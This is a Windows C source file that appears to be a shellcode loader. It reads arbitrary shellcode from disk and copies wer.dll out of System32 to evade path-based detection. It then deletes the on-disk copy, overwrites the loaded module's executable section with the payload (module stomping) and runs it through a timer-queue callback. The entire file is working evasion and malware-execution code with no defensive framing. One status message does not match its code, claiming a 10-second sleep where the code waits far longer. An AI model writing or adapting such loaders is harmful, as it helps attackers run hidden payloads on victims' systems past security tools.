#include <windows.h>
#include <stdio.h>
#include <winnt.h>

// Function to perform module stomping from a copied module and execute via timer callback
BOOL ModuleStompAndExecute(unsigned char* shellcode, size_t shellcode_size);

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <path_to_shellcode.bin>\n", argv[0]);
        return 1;
    }

    // Read shellcode from file
    FILE *fp;
    if (fopen_s(&fp, argv[1], "rb") != 0 || fp == NULL) {
        perror("[-] Failed to open shellcode file");
        return 1;
    }

    fseek(fp, 0, SEEK_END);
    size_t shellcode_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    unsigned char *shellcode = (unsigned char*)malloc(shellcode_size);
    if (!shellcode) {
        perror("[-] Failed to allocate memory for shellcode");
        fclose(fp);
        return 1;
    }

    size_t bytes_read = fread(shellcode, 1, shellcode_size, fp);
    if (bytes_read != shellcode_size) {
        perror("[-] Failed to read shellcode file completely");
        free(shellcode);
        fclose(fp);
        return 1;
    }
    fclose(fp);

    printf("[+] Shellcode read from %s (%zu bytes)\n", argv[1], shellcode_size);

    // Perform module stomping and indirect execution
    if (!ModuleStompAndExecute(shellcode, shellcode_size)) {
        printf("[-] Module stomping and execution failed.\n");
        free(shellcode);
        return 1;
    }

    printf("[+] Module stomping and timer creation successful. Waiting for shellcode to execute...\n");
    free(shellcode);
    return 0;
}

BOOL ModuleStompAndExecute(unsigned char* shellcode, size_t shellcode_size) {
    // === EVASION STEP 1: Copy a system DLL to a non-system path ===
    const char* target_module_name = "wer.dll";
    char system_dll_path[MAX_PATH];
    char temp_path[MAX_PATH];
    char temp_dll_path[MAX_PATH];

    // Get the full path to the legitimate DLL in System32
    if (GetSystemDirectoryA(system_dll_path, MAX_PATH) == 0) {
        printf("[-] Failed to get system directory. Error: %lu\n", GetLastError());
        return FALSE;
    }
    sprintf_s(system_dll_path, MAX_PATH, "%s\\%s", system_dll_path, target_module_name);
    printf("[*] Original module path: %s\n", system_dll_path);

    // Get a temporary path to copy the DLL to
    if (GetTempPathA(MAX_PATH, temp_path) == 0) {
        printf("[-] Failed to get temp path. Error: %lu\n", GetLastError());
        return FALSE;
    }
    if (GetTempFileNameA(temp_path, "tmp", 0, temp_dll_path) == 0) {
        printf("[-] Failed to create temp file name. Error: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[*] New temporary module path: %s\n", temp_dll_path);

    // Copy the file. This is the core of the bypass for path-based detections.
    if (!CopyFileA(system_dll_path, temp_dll_path, FALSE)) {
        printf("[-] Failed to copy %s to %s. Error: %lu\n", system_dll_path, temp_dll_path, GetLastError());
        return FALSE;
    }
    printf("[+] Copied %s to %s\n", target_module_name, temp_dll_path);

    // === EVASION STEP 2: Load the DLL from the non-system path ===
    HMODULE hModule = LoadLibraryA(temp_dll_path);
    if (hModule == NULL) {
        printf("[-] Failed to load copied module from %s. Error: %lu\n", temp_dll_path, GetLastError());
        DeleteFileA(temp_dll_path); // Cleanup
        return FALSE;
    }
    printf("[+] Loaded copied module at base address: 0x%p\n", (void*)hModule);

    // Clean up the on-disk artifact immediately after loading it into memory.
    if (!DeleteFileA(temp_dll_path)) {
        printf("[!] Warning: Failed to delete temporary file %s. Error: %lu\n", temp_dll_path, GetLastError());
    } else {
        printf("[+] Deleted temporary file from disk.\n");
    }

    // === MODULE STOMPING LOGIC (unchanged) ===
    // 2. Parse PE headers to find the .text section
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Invalid DOS signature.\n");
        FreeLibrary(hModule);
        return FALSE;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Invalid NT signature.\n");
        FreeLibrary(hModule);
        return FALSE;
    }

    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    PIMAGE_SECTION_HEADER textSection = NULL;

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            textSection = sectionHeader;
            printf("[+] Found executable section '%s' at RVA 0x%X\n", textSection->Name, textSection->VirtualAddress);
            break;
        }
        sectionHeader++;
    }

    if (textSection == NULL) {
        printf("[-] Could not find an executable section.\n");
        FreeLibrary(hModule);
        return FALSE;
    }
    
    if (textSection->SizeOfRawData < shellcode_size) {
        printf("[-] Executable section is too small (%u bytes) for the shellcode (%zu bytes).\n", textSection->SizeOfRawData, shellcode_size);
        FreeLibrary(hModule);
        return FALSE;
    }
    
    LPVOID textSectionAddress = (LPVOID)((LPBYTE)hModule + textSection->VirtualAddress);

    DWORD oldProtect;
    if (!VirtualProtect(textSectionAddress, shellcode_size, PAGE_READWRITE, &oldProtect)) {
        printf("[-] Failed to change memory permissions to RW. Error: %lu\n", GetLastError());
        FreeLibrary(hModule);
        return FALSE;
    }
    printf("[+] Changed memory permissions to PAGE_READWRITE.\n");

    memcpy(textSectionAddress, shellcode, shellcode_size);
    printf("[+] Copied shellcode to target section.\n");

    if (!VirtualProtect(textSectionAddress, shellcode_size, oldProtect, &oldProtect)) {
        printf("[-] Failed to restore memory permissions. Error: %lu\n", GetLastError());
    }
    printf("[+] Restored memory permissions.\n");

    // === INDIRECT EXECUTION LOGIC (unchanged) ===
    printf("[*] Creating timer queue to execute shellcode...\n");
    HANDLE hTimerQueue = CreateTimerQueue();
    if (hTimerQueue == NULL) {
        printf("[-] Failed to create timer queue. Error: %lu\n", GetLastError());
        FreeLibrary(hModule);
        return FALSE;
    }

    HANDLE hTimer = NULL;
    if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)textSectionAddress, NULL, 100, 0, WT_EXECUTEINTIMERTHREAD)) {
        printf("[-] Failed to create timer queue timer. Error: %lu\n", GetLastError());
        DeleteTimerQueue(hTimerQueue);
        FreeLibrary(hModule);
        return FALSE;
    }

    printf("[+] Timer created. Main thread will sleep for 10 seconds to allow callback execution.\n");
    Sleep(1000000);

    printf("[+] Cleaning up resources.\n");
    DeleteTimerQueueTimer(hTimerQueue, hTimer, NULL);
    DeleteTimerQueue(hTimerQueue);
    FreeLibrary(hModule);

    return TRUE;
}